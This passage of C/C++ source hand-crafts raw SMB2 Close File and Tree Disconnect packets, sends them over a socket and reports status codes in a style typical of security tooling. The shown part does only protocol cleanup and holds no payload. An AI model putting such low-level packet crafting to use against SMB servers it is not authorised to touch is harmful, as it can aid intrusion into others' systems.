    memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);
    memset(netsess, 0, 4);
    netsess[3] = 0x58;
    memcpy(fileid, recBuffer + 132, 16);
    memcpy(close_file + 8, fileid, 16);
    memcpy(finalPacket, netsess, 4);
    memcpy(finalPacket + 4, s2h.buffer, sizeof(s2h.buffer));
    memcpy(finalPacket + 4 + sizeof(s2h.buffer), close_file, sizeof(close_file));
    send(s, finalPacket, 4 + sizeof(s2h.buffer)+sizeof(close_file), 0);
    // here we receive the return status of the Close File Request from SMB
    recv(s, recBuffer, DEFAULT_BUFLEN, 0);
    unsigned int* closeFileStatus = (unsigned int*)(recBuffer + 12);
    if (*closeFileStatus != 0) {
        printf("[!] SMB Close File Request failed with status code 0x%x\n", *closeFileStatus);
        ret = FALSE;
    }
    else {
        printf("[+] SMB Close File success\n");
    }
    return ret;
}

BOOL SMB2TreeDisconnect(SOCKET s, char* recBuffer, int& MessageID) {
    BOOL ret = TRUE;
    myint mpid;
    usmb2_header s2h;
    unsigned char sessid[8];
    char netsess[4];
    char finalPacket[DEFAULT_BUFLEN];

    unsigned char tree_disconnect[] = "\x04\x00\x00\x00";

    memcpy(&sessid[0], &recBuffer[44], 8);
    mpid.i = GetCurrentProcessId();
    memset(netsess, 0, 4);
    netsess[3] = 0x44;
    memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
    memcpy(&s2h.smb2_header.CreditCharge, "\01\00", 2);
    memcpy(&s2h.smb2_header.StructureSize, "\x40\x00", 2);
    memcpy(&s2h.smb2_header.ChannelSequence[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Reserved[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Command[0], "\x04\x00", 2);
    memcpy(&s2h.smb2_header.CreditRequest[0], "\x1f\x00", 2);
    memcpy(&s2h.smb2_header.Flags[0], "\x30\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.NextCommand[0], "\x00\x00\x00\x00", 4);
    s2h.smb2_header.MessageID = MessageID++;// , "\x10\x00\x00\x00\x00\x00\x00\x00", 8);
    memcpy(&s2h.smb2_header.ProcessID[0], mpid.buffer, 4);
    memcpy(&s2h.smb2_header.TreeID[0], "\x01\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.SessionID[0], sessid, 8);
    memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);
    
    memcpy(finalPacket, netsess+1, 3);
    memcpy(finalPacket + 3, s2h.buffer, sizeof(s2h.buffer));
    memcpy(finalPacket + 3 + sizeof(s2h.buffer), tree_disconnect, sizeof(tree_disconnect));
    send(s, finalPacket, 3 + sizeof(s2h.buffer) + sizeof(tree_disconnect), 0);
    // here we receive the return status of the Close File Request from SMB
    recv(s, recBuffer, DEFAULT_BUFLEN, 0);
    unsigned int* treeDisconnectStatus = (unsigned int*)(recBuffer + 12);
    if (*treeDisconnectStatus != 0) {
        printf("[!] SMB Tree Disconnect failed with status code 0x%x\n", *treeDisconnectStatus);
        ret = FALSE;
    }
    else {
        printf("[+] SMB Tree Disconnect success\n");
    }
    return ret;
}